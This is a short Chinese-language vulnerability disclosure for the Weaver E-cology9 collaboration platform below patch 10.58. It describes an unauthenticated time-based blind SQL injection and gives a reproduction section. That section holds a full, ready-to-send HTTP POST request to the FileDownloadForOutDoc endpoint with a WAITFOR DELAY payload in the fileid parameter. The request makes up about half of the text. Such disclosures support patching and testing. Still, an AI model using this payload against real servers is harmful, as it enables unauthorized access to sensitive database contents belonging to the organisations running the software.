#### 影响范围

泛微E-cology9 补丁版本 < 10.58

#### 漏洞概述

泛微协同管理应⽤平台(e-cology)是⼀套兼具企业信息⻔户、知识管理、 数据中⼼、⼯作流管理、人力资源管理、客户与合作伙伴管理、项⽬管理、财务管理、资产管理功能的协同商务平台，泛微 ecology9协同办公系统在10.58.0补丁之前存在SQL注⼊漏洞，未经授权的攻击者可以利⽤延时盲注进⾏SQL注⼊从⽽获取数据库中的敏感信息

#### 漏洞复现

请求数据包：

```
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0;
Content-Length: 70
Accept-Charset: utf-8
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

fileid=2+WAITFOR+DELAY+%270:0:3%27&isFromOutImg=1
```

